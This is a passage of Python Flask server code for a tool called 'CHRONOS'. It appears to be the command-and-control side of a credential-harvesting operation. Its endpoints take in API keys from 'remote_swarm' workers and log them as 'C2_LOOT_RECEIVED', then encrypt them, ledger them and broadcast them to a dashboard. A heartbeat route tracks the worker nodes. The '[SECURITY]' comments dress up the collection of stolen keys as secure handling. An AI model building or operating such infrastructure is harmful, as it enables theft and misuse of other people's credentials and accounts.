    # Let's call internal logic to ensure consistency.
    
    items = data if isinstance(data, list) else [data]
    processed = 0
    
    for item in items:
        if isinstance(item, str):
            item = {"full_key": item, "key": item} # basic wrapper
        
        api_key_raw = item.get("full_key") or item.get("key")
        if api_key_raw:
             # [SECURITY] 1. Encrypt
            encrypted_key = crypto.encrypt_data(api_key_raw)
            
            # [SECURITY] 2. Ledger
            ledger_hash = chronos_ledger.add_block({
                "key_hash_sha256": hashlib.sha256(api_key_raw.encode()).hexdigest(),
                "timestamp": time.time(),
                "source": f"remote_swarm_{request.remote_addr}",
                "encrypted_ref": encrypted_key[:10] + "..."
            })
            
            # [SECURITY] 3. Audit
            audit_log.log_event("C2_LOOT_RECEIVED", request.remote_addr, f"Key secured. Hash: {ledger_hash}", "SUCCESS")
            
            # Broadcast
            item['ledger_hash'] = ledger_hash
            item['encrypted_key'] = encrypted_key
            socketio.emit('key_new', item)
            processed += 1
            
    return jsonify({"status": "received", "count": processed}), 200

@app.route("/api/c2/heartbeat", methods=["POST"])
@require_swarm_auth
def c2_heartbeat():
    """Worker reports status."""
    data = request.json
    node_id = data.get("node_id", "unknown")
    status = data.get("status", "idle")
    
    with c2_lock:
        c2_active_nodes[node_id] = {
            "ip": request.remote_addr,
            "last_seen": time.time(),
            "status": status
        }
        
    return jsonify({"status": "ack"}), 200



# =====================
# MAIN
# =====================

if __name__ == "__main__":
    print("\n" + "="*70)
    print("   CHRONOS // ULTRA-FAST SERVER // WORLD-CLASS PERFORMANCE")
    print("="*70)
    print(f"📁 Database: {Config.DB_FILE}")
    print(f"🌐 Web: {Config.WEB_DIR}")
    print(f"📡 Redis: {'✅ Connected' if REDIS_AVAILABLE else '❌ Not Available'}")
    print(f"🚀 Server: http://localhost:5050")
    print("="*70 + "\n")
    
    # Start background engines
    stats_engine.start()
    start_redis_listener()
    
    # Run server
    socketio.run(app, host="0.0.0.0", port=5050, debug=Config.DEBUG)
